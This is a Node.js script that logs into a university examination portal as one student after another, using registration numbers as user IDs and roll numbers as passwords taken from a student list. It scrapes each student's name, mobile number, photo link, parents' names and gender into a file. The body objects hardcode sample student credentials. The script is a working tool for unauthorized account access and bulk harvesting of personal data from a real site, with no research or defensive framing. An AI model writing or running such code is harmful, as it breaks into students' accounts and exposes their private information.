const rp = require('request-promise');
const cheerio = require('cheerio')
const axios = require('axios');
var tough = require('tough-cookie');
let students = {}

let arr = require('./dataArr.js')
let fs = require('fs');

fs.writeFile('./data.js', "module.exports = [", function(err){
      if(err) throw err;
})

var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;

let studentArr = arr.map (e => {
  return {
    password: e.RollNo.replace(/\s/g,''),
    userId : e.RegdNo.replace(/\s/g,'')
  }
})

console.log(studentArr)

const headers = {

    "Host": "exam.pupadmissions.ac.in",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://exam.pupadmissions.ac.in/Examination_Form/LoginCollege.aspx",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Cache-Control": "no-cache, no-store"
}

const header2 = {
    "Host": "exam.pupadmissions.ac.in",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:67.0) Gecko/20100101 Firefox/67.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    // "Accept-Language": "en-US,en;q=0.5",
    // "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

let body = {
    "__EVENTTARGET": "student",
    "__EVENTARGUMENT": "",
    "__VIEWSTATE": "",
    "__VIEWSTATEGENERATOR": "",
    "EVENTVALIDATION": "",
    "txt_userid": "",
    "txt_pwd": "",
    "txt_username_o": "",
    "txt_pwd_o": "",
    "StuUID": "714-17-514",
    "StuPwd": "9901",
    "btnStuLogin": "Login"
}

let header3 = {
    "Cache-Control": "max-age=1500",
    "Host": "exam.pupadmissions.ac.in",
    // "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:67.0) Gecko/20100101 Firefox/67.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    // "Accept-Language": "en-US,en;q=0.5",
    // "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://exam.pupadmissions.ac.in/Examination_Form/LoginCollege.aspx",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

// const headers = {
//     "Connection": "keep-alive",
//     "Content-Type": "application/x-www-form-urlencoded",

//     "Cache-Control": "no-cache, no-store",

// }

// const header2 = {
//     "Connection": "keep-alive",

//     "Content-Type": "application/x-www-form-urlencoded",
//     "Cache-Control": "no-cache, no-store",
//     "Upgrade-Insecure-Requests": "5",
// }

// const body = {
//     "__EVENTTARGET": "student",
//     "__EVENTARGUMENT": "",
//     "__VIEWSTATE": "",
//     "__VIEWSTATEGENERATOR": "",
//     "EVENTVALIDATION": "",
//     "txt_userid": "",
//     "txt_pwd": "",
//     "txt_username_o": "",
//     "txt_pwd_o": "",
//     "StuUID": "714-17-622",
//     "StuPwd": "10013",
//     "btnStuLogin": "Login"
// }

let i = 0

let intervalId = setInterval(()=> {
    if(i === studentArr.length -1) clearInterval(intervalId)
    body["StuUID"] = studentArr[i].userId;
    body["StuPwd"] = studentArr[i].password;
    i++;
    main()
},6000)



function main() {

    rp({
            method: "get",
            uri: "https://exam.pupadmissions.ac.in/Examination_Form/LoginCollege.aspx",
            headers: header2
        })
        .then(res => {
            let $ = cheerio.load(res);
            let eventValidation = $("input#__EVENTVALIDATION").prop("value"),
                viewStateGenerator = $("input#__VIEWSTATEGENERATOR").prop("value"),
                viewState = $("input#__VIEWSTATE").prop("value");

            body["__EVENTVALIDATION"] = eventValidation;
            body["__VIEWSTATEGENERATOR"] = viewStateGenerator;
            body["__VIEWSTATE"] = viewState;


            // console.log(body=toUrlEncoded(body))
            // console.log(body)
            rp({
                    method: "POST",
                    uri: "https://exam.pupadmissions.ac.in/Examination_Form/LoginCollege.aspx",
                    headers: headers,
                    form: body,
                    resolveWithFullResponse: true,
                })
                .then(d => {
                    console.log(d.statusCode);
                    // extractData(d);
                })
                .catch(err => {
                    let headers2 = err.response.headers;

                    let Cookie = headers2['set-cookie'][0].split(';')[0];
                    header3['Cookie'] = Cookie
                    // console.log(Cookie)
                    // let cookie = new tough.Cookie({
                    //     key: "ASP.NET_SessionId",
                    //     value: Cookie[0].split('=')[1],
                    //     domain: 'exam.pupadmissions.ac.in',
                    //     httpOnly: true,
                    //     path: '/',
                    //     maxAge: 31536000
                    // });
                    // var cookiejar = rp.jar();
                    // cookiejar._jar.rejectPublicSuffixes = false;
                    // cookiejar.setCookie(cookie.toString(), 'https://exam.pupadmissions.ac.in/Examination_Form/paper.aspx');
                    rp({
                            uri: "https://exam.pupadmissions.ac.in/Examination_Form/LoginCollege.aspx",
                            headers: header3,
                            method: "post",
                            form: body
                        })
                        .then(res => extractData(res))
                })

            // var xhttp = new XMLHttpRequest();
            //     xhttp.onreadystatechange = function() {
            //         console.log(this.status)
            //         if (this.readyState == 4 && this.status == 200) {
            //             // Typical action to be performed when the document is ready:
            //             // document.getElementById("demo").innerHTML = xhttp.responseText;
            //         }
            //     };
            //     xhttp.open("POST", "https://exam.pupadmissions.ac.in/Examination_Form/LoginCollege.aspx");

            //     Object.keys(headers).forEach(e => xhttp.setRequestHeader(e, JSON.stringify(headers[e])))
            //     xhttp.send(JSON.stringify(body));
        }).catch(err => console.log(err))

    function extractData(data) {
        // console.log(data)

        let $ = cheerio.load(data);
        let rollno = $("#lblRollNo").text();
        let obj = {
            rollno: rollno,
            image: $("#Image1").prop("src"),
            name: $("#lblApp_Name").text(),
            registration: $("#lblRegNo").text(),
            mobile: $("#lblApp_MobileNo").text(),
            id: $("LblId").text(),
            batch: $("LblClass").text(),
            father: $("lblApp_FatherName").text(),
            mother: $("lblApp_MotherName").text(),
            gender: $("lblApp_Gender").text(),
        }
        console.log(rollno, obj.name, obj.mobile)
        writeFile(obj)
    }

    const toUrlEncoded = obj => Object.keys(obj).map(k => encodeURIComponent(k) + '=' + encodeURIComponent(obj[k])).join('&');
}
function writeFile(data){
    let string = JSON.stringify(data) + ","
    fs.appendFile('./data.js', string, function(err){
      if(err) throw err;
    })
}
